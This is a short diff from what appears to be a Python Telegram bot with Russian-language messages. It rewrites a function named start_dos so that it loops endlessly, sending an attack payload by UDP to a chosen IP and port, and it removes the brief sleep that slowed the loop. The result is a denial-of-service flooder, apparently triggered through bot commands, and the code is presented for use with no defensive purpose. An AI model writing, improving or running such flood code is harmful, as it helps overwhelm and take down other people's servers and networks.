@@ -28,7 +28,6 @@ async def get_ping(message: Message, dos_data: FSMContextProxy):
                             f"Количество обновлений: {i}")
 
 
-async def start_dos(connect, ip: str, port: int, attack: bytes):
+def start_dos(connect, ip: str, port: int, attack: bytes):
     while True:
         connect.sendto(attack, (ip, port))
-        await asyncio.sleep(0.000000000000001)
